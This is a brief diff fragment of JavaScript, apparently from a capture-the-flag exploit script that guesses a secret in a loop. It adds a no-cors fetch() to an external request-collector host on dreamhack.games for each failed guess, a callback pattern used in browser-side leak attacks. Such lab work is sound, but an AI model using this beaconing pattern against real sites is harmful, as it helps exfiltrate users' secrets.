@@ -49,6 +49,10 @@
                             console.log(`found: ${secret}`);
                             found = true;
                             break;
+                        } else {
+                            fetch(`https://fyttbsg.request.dreamhack.games?nop=nop`, {
+                                mode: 'no-cors'
+                            });
                         }
                     }
 
